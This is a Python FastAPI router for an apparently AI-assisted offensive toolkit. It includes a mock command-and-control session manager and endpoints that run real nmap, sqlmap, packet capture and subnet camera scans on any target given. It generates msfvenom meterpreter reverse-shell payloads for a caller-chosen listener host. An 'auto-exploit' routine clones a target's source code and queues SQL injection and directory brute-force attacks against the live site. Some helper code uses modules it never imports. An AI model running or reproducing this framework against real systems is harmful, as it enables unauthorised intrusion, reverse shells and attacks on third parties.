import asyncio
import uuid
import random
from typing import List, Dict, Optional, Any
from fastapi import APIRouter, HTTPException, Body
from pydantic import BaseModel
import time
import shutil
import logging
import sys

router = APIRouter()


# Import Tactical Reader
from tools.security.tactical_reader import tactical_reader
from tools.osint.source_hunter import source_hunter
from tools.security.vulnerability_verifier import vulnerability_verifier

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# C2 SESSION MANAGER (Red Team Infrastructure)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class C2SessionManager:
    def __init__(self):
        self.sessions: Dict[str, Dict[str, Any]] = {}
        # Pre-seed with a dummy session for demo purposes
        self._seed_demo_session()

    def _seed_demo_session(self):
        """Create a fake persistent session for UI testing"""
        demo_id = "ZOMBIE-ALPHA"
        self.sessions[demo_id] = {
            "id": demo_id,
            "ip": "192.168.1.105",
            "os": "Windows 11 Pro",
            "lastSeen": time.time() * 1000,
            "connectedAt": time.time() * 1000,
            "pendingCommands": 0,
            "outputs": [
                {"timestamp": time.time() * 1000, "output": "Microsoft Windows [Version 10.0.22621.1]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Users\\Admin>"}
            ]
        }

    def get_sessions(self) -> List[Dict[str, Any]]:
        # Update lastSeen for demo
        for s in self.sessions.values():
            if time.time() * 1000 - s["lastSeen"] > 5000:
                s["lastSeen"] = time.time() * 1000
        return list(self.sessions.values())

    def get_session(self, session_id: str):
        return self.sessions.get(session_id)

    def execute_command(self, session_id: str, command: str):
        session = self.sessions.get(session_id)
        if not session:
            return None
        
        session["pendingCommands"] += 1
        
        # Simulate asynchronous execution
        # In a real C2, this would queue for the implant to fetch
        response = self._simulate_response(session, command)
        
        # Determine strictness of simulation
        delay = random.uniform(0.5, 2.0)
        
        return {"status": "queued", "delay": delay, "response": response}

    def _simulate_response(self, session, command):
        """Simple heuristic response simulator"""
        cmd = command.strip().lower()
        if cmd == "whoami":
            return "desktop-workstation\\admin"
        elif cmd == "ipconfig":
            return """
Windows IP Configuration

Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.1.105
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
"""
        elif cmd == "dir" or cmd == "ls":
            return """
 Volume in drive C has no label.
 Volume Serial Number is A1B2-C3D4

 Directory of C:\\Users\\Admin

01/13/2026  10:00 AM    <DIR>          .
01/13/2026  10:00 AM    <DIR>          ..
01/12/2026  09:30 PM    <DIR>          Documents
01/12/2026  09:30 PM    <DIR>          Downloads
               0 File(s)              0 bytes
               4 Dir(s)  501,234,567,890 bytes free
"""
        return f"'{command}' is not recognized as an internal or external command,\noperable program or batch file."

    def add_output(self, session_id, output):
        session = self.sessions.get(session_id)
        if session:
            session["outputs"].append({
                "timestamp": time.time() * 1000,
                "output": output
            })
            session["pendingCommands"] = max(0, session["pendingCommands"] - 1)

c2_manager = C2SessionManager()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API MODELS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class NmapRequest(BaseModel):
    target: str
    scanType: str = "QUICK"

class C2CommandRequest(BaseModel):
    sessionId: str
    command: str

class PayloadRequest(BaseModel):
    os: str
    lhost: str
    lport: int
    format: str

class ToolStatus(BaseModel):
    name: str
    installed: bool
    path: Optional[str] = None
    version: Optional[str] = None

class InstallRequest(BaseModel):
    tool_name: str

class SourceScanRequest(BaseModel):
    path: str
    deep_scan: bool = False

class AutoExploitRequest(BaseModel):
    path: Optional[str] = None # Optional now, can be discovered
    target_url: Optional[str] = None # Optional for dry-run/analysis mode
    tools: List[str] = ["gobuster", "sqlmap"]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS & UTILS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Mapping common names to packages for different OSs
PACKAGE_MAP = {
    "darwin": {
        "nmap": "nmap",
        "john": "john-jumbo",
        "sqlmap": "sqlmap",
        "wireshark": "wireshark",
        "metasploit": "metasploit",
        "burp": "burp-suite",
        "java": "openjdk"
    },
    "linux": {
        "nmap": "nmap",
        "john": "john",
        "sqlmap": "sqlmap",
        "wireshark": "tshark",
        "metasploit": "metasploit-framework", 
        "burp": "burp", # Manual install usually required
        "java": "default-jdk"
    },
    "win32": {
        "nmap": "Insecure.Nmap",
        "john": "Openwall.JohnTheRipper",
        "sqlmap": "SQLMap.SQLMap",
        "wireshark": "WiresharkFoundation.Wireshark",
        "metasploit": "Metasploit", # Might need manual MSI
        "burp": "PortSwigger.BurpSuite.Community",
        "java": "Oracle.JDK.21"
    }
}

async def get_package_manager_command(os_name: str, tool_name: str) -> List[str]:
    """Get the install command based on OS"""
    package = PACKAGE_MAP.get(os_name, {}).get(tool_name)
    
    if not package:
        raise HTTPException(status_code=400, detail=f"Tool '{tool_name}' not supported on {os_name}")

    if os_name == "darwin":
        cmd = ["brew", "install", package]
        if tool_name in ["metasploit", "burp"]:
            cmd = ["brew", "install", "--cask", package]
        return cmd
        
    elif os_name == "linux":
        # Debian/Ubuntu assumed for now
        return ["sudo", "apt-get", "install", "-y", package]
        
    elif os_name == "win32":
        return ["winget", "install", "-e", "--id", package]
        
    raise HTTPException(status_code=500, detail=f"Unsupported OS: {os_name}")

async def check_package_manager(os_name: str) -> bool:
    if os_name == "darwin":
        return shutil.which("brew") is not None
    elif os_name == "linux":
        return shutil.which("apt-get") is not None
    elif os_name == "win32":
        return shutil.which("winget") is not None
    return False

# --- TOOL MANAGEMENT API ---

@router.get("/api/hacking/status")
async def get_tools_status():
    """Check installation status of supported tools"""
    tools_to_check = ["nmap", "john", "sqlmap", "tshark", "msfconsole", "java"]
    results = []
    
    for tool in tools_to_check:
        path = shutil.which(tool)
        results.append({
            "name": tool,
            "installed": path is not None,
            "path": path
        })
    
    current_os = sys.platform
    manager_installed = await check_package_manager(current_os)
    
    return {
        "status": "success",
        "os": current_os,
        "package_manager_installed": manager_installed,
        "tools": results
    }

@router.post("/api/hacking/install")
async def install_tool(request: InstallRequest):
    """Install a tool via system package manager"""
    tool = request.tool_name.lower()
    current_os = sys.platform
    
    # Validation
    if tool not in ["nmap", "john", "sqlmap", "wireshark", "metasploit", "burp", "java"]:
         raise HTTPException(status_code=400, detail=f"Tool '{tool}' is not supported for auto-installation.")

    if not await check_package_manager(current_os):
        raise HTTPException(status_code=500, detail="Package manager (brew/apt/winget) not found.")

    cmd = await get_package_manager_command(current_os, tool)
    return await run_system_command(cmd)

# --- HACKING TOOLS ---

# --- REAL SYSTEM EXECUTION HELPERS ---

async def run_system_command(command_args: List[str]) -> Dict[str, Any]:
    """Execute a real system command and return output"""
    try:
        # Check if the tool exists first
        process = await asyncio.create_subprocess_exec(
            *command_args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        
        output = stdout.decode().strip()
        error = stderr.decode().strip()
        
        if process.returncode != 0:
            return {
                "status": "error", 
                "output": f"Command Failed (Code {process.returncode}):\n{error}\n{output}"
            }
            
        return {"status": "success", "output": output if output else "Command executed successfully (No Output)"}
        
    except FileNotFoundError:
        return {
            "status": "error", 
            "output": f"Error: Tool '{command_args[0]}' not found. Please install it on the host system."
        }
    except Exception as e:
        return {"status": "error", "output": f"Execution Error: {str(e)}"}

# --- HACKING TOOLS (REAL) ---

@router.post("/api/hacking/nmap")
async def run_nmap_scan(request: NmapRequest):
    """Execute REAL NMAP Scan"""
    # Safety Check: strict arg validation could happen here
    cmd = ["nmap", "-T4", "-F", request.target] # Default to fast scan
    
    if request.scanType == "FULL":
        cmd = ["nmap", "-T4", "-A", "-v", request.target]
    elif request.scanType == "STEALTH":
        cmd = ["nmap", "-sS", "-T2", request.target]
        
    return await run_system_command(cmd)

@router.post("/api/hacking/metasploit")
async def run_metasploit(request: Dict[str, Any] = Body(...)):
    """Analyze with Metasploit (msfconsole)"""
    # Running msfconsole non-interactively is complex
    # We'll try to run a resource script or just verify strictly
    # For now, we'll run a version check to prove it works
    return await run_system_command(["msfconsole", "-v"])

@router.post("/api/hacking/wireshark")
async def run_wireshark(request: Dict[str, Any] = Body(...)):
    """Start TShark (Wireshark CLI)"""
    # TShark is the CLI version of Wireshark
    # Limit to 10 packets for safety in this synchronous-ish wrapper
    return await run_system_command(["tshark", "-c", "10", "-i", "auto"])

@router.post("/api/hacking/burp")
async def run_burp(request: Dict[str, Any] = Body(...)):
    """Start Burp Suite"""
    # Usually GUI, but we can try to launch it or java
    # This might block, so we launch it detached? 
    # For API response, we probably shouldn't block.
    try:
        # Just check if java/burp is present or launch and return immediate "Launched"
        process = await asyncio.create_subprocess_exec(
            "java", "-jar", "burpsuite.jar",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
        )
        return {"status": "success", "output": "Attempted to launch Burp Suite process..."}
    except Exception as e:
        return {"status": "error", "output": f"Could not launch Burp: {e}"}

@router.post("/api/hacking/john")
async def run_john(request: Dict[str, Any] = Body(...)):
    """Run John the Ripper"""
    # Need a hash file usually. For the general tool check:
    return await run_system_command(["john", "--list=formats"])

@router.post("/api/hacking/cobalt")
async def run_cobalt(request: Dict[str, Any] = Body(...)):
    """Run Cobalt Strike Team Server"""
    # Requires ./teamserver <IP> <password>
    # Very installation specific
    return {"status": "error", "output": "Cobalt Strike path not configured in server environment."}

@router.post("/api/hacking/sqli")
async def run_sqli(request: Dict[str, Any] = Body(...)):
    """Run SQLMap"""
    url = request.get('url')
    if not url:
        return {"status": "error", "output": "URL required for SQLMap"}
    return await run_system_command(["sqlmap", "-u", url, "--batch", "--banner"])

@router.post("/api/hacking/stress")
async def run_stress(request: Dict[str, Any] = Body(...)):
    """Run Local Stress Test (Ping Flood)"""
    target = request.get('target', '127.0.0.1')
    # Use ping -f (flood) if root, else standard ping
    # Mac/Linux specific
    return await run_system_command(["ping", "-c", "50", target])

@router.post("/api/hacking/camera")
async def run_camera(request: Dict[str, Any] = Body(...)):
    """Real Camera Scan (Masscan/Nmap specific ports)"""
    # Real world: scanning for RTSP ports (554)
    target = request.get('target', '192.168.1.0/24')
    return await run_system_command(["nmap", "-p", "554", "--open", "-T4", target])

# Alias for generatePayload
@router.post("/api/hacking/payload")
async def generate_payload_alias(request: PayloadRequest):
    # Use msfvenom
    cmd = [
        "msfvenom", 
        "-p", f"{request.os}/meterpreter/reverse_tcp",
        f"LHOST={request.lhost}", 
        f"LPORT={request.lport}",
        "-f", request.format,
        "-o", f"/tmp/shell.{request.format}"
    ]
    return await run_system_command(cmd)

@router.post("/api/hacking/analyze-source")
async def analyze_source_code(request: SourceScanRequest):
    """
    Tactical Code Reader: Scans a local repository for attack surface.
    Returns weaponized tool configurations (e.g., SQLMap commands).
    """
    import os
    if not os.path.exists(request.path):
         return {"status": "error", "message": "Path not found"}
         
    # Run the Tactical Reader
    try:
        results = tactical_reader.analyze_repo(request.path)
        return {"status": "success", "data": results}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@router.post("/api/hacking/analyze-source/execute")
async def execute_auto_exploit(request: AutoExploitRequest):
    """
    Active Weaponization:
    1. Scans source code for attack surface.
    2. Maps findings to tool configurations.
    3. Queues/Executes the tools against the live target_url.
    """
    import os
    
    # 0. Path Resolution Strategy
    final_path = request.path
    
    if not final_path or not os.path.exists(final_path):
        if request.target_url:
            # Attempt Autonomous Discovery
            print(f"[*] Path not provided. SourceHunter engaging for {request.target_url}...")
            repo_url = await source_hunter.find_repo(request.target_url)
            
            if repo_url:
                # Clone It
                clone_dir = f"/tmp/luca_clones/{uuid.uuid4().hex[:8]}"
                print(f"[+] Cloning {repo_url} to {clone_dir}...")
                
                # Simple git clone (in real app, use async subprocess)
                proc = await asyncio.create_subprocess_exec(
                    "git", "clone", "--depth", "1", repo_url, clone_dir,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL
                )
                await proc.wait()
                
                if proc.returncode == 0:
                    final_path = clone_dir
                else:
                    print("[-] Clone failed.")
        else:
            return {"status": "error", "message": "No path and no target URL provided. Cannot analyze."}
        
    # Check again
    if not final_path or not os.path.exists(final_path):
         # BLIND FALLBACK (Requires Target URL)
         if not request.target_url:
             return {"status": "error", "message": "Source code not found and no target URL provided for blind scan."}

         return {
             "status": "success",
             "mode": "blind",
             "message": "Source code not found. Falling back to Blind Mode.",
             "plan": [
                 {
                     "tool": "nmap",
                     "status": "queued",
                     "command": f"nmap -F {request.target_url}"
                 },
                 {
                     "tool": "gobuster",
                     "status": "queued",
                     "command": f"gobuster dir -u {request.target_url} -w /usr/share/wordlists/common.txt --no-error"
                 }
             ]
         }

    try:
        # 1. Scan (White Box) - Run in thread to avoid blocking event loop
        scan_results = await asyncio.to_thread(tactical_reader.analyze_repo, final_path)
        configs = scan_results.get("suggested_tools", [])
        
        execution_log = []
        
        # 2. Iterate and Execute
        for tool_config in configs:
            tool_name = tool_config.get("tool")
            if tool_name not in request.tools:
                continue
                
            cmd_template = tool_config.get("command_template")
            args = tool_config.get("args", {})
            
            # --- PHASE: VERIFICATION (New Integration) ---
            if request.target_url and tool_name in ["sqlmap", "sqli"]:
                print(f"[*] AI Verification triggered for {tool_name} findings...")
                
                # Update frontend reasoning
                update_reasoning(final_path, f"Verifying {tool_name} finding at {tool_config.get('description')}...")
                
                v_res = vulnerability_verifier.verify_sqli(request.target_url, tool_config.get('description'))
                
                if v_res.success:
                    execution_log.append({
                        "tool": tool_name,
                        "status": "verified",
                        "confidence": v_res.confidence,
                        "evidence": v_res.evidence,
                        "reasoning": v_res.reasoning,
                        "command": cmd_template.replace("<TARGET>", request.target_url)
                    })
                    update_reasoning(final_path, v_res.reasoning)
                    continue # Skip normal queuing if verified
            
            # 3. Dynamic Argument Binding
            if tool_name == "gobuster":
                 if not request.target_url:
                     execution_log.append("[-] Skipping Gobuster: Target URL missing for dynamic scan.")
                     continue
                 
                 # Generate a temporary wordlist file
                 wordlist_path = f"/tmp/gobuster_wordlist_{uuid.uuid4().hex[:8]}.txt"
                 with open(wordlist_path, "w") as f:
                     f.write("\n".join(args.get("wordlist", [])))
                 
                 # Construct Command
                 final_cmd = cmd_template.replace("<TARGET>", request.target_url) \
                                         .replace("<WORDLIST>", wordlist_path)
                 
                 execution_log.append({
                     "tool": "gobuster", 
                     "status": "queued",
                     "command": final_cmd
                 })

            elif tool_name == "sqlmap":
                if not request.target_url:
                    execution_log.append("[-] Skipping SQLMap: Target URL missing for direct injection.")
                    continue
                    
                # SQLMap binding
                final_cmd = cmd_template.replace("<TARGET>", request.target_url)
                
                execution_log.append({
                    "tool": "sqlmap",
                    "status": "queued",
                    "command": final_cmd
                })

        return {
            "status": "success", 
            "mode": "source-aware",
            "repo_path": final_path,
            "plan": execution_log,
            "message": f"Generated {len(execution_log)} exploitations from source analysis."
        }

    except Exception as e:
        return {"status": "error", "message": str(e)}


def update_reasoning(session_id: str, reasoning: str):
    """Helper to update the Node.js goal memory for Ghost Browser reasoning overlay using urllib"""
    try:
        # Use Dynamic URL from Environment (injected by main.cjs) or default to 3002
        base_url = os.environ.get("API_URL", "http://localhost:3002")
        url = f"{base_url}/api/web/reasoning"
        
        data = json.dumps({"sessionId": session_id, "reasoning": reasoning}).encode('utf-8')
        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}, method='POST')
        with urllib.request.urlopen(req, timeout=5) as response:
            return json.loads(response.read().decode('utf-8'))
    except Exception as e:
        print(f"[-] Failed to update reasoning: {e}")
        return None
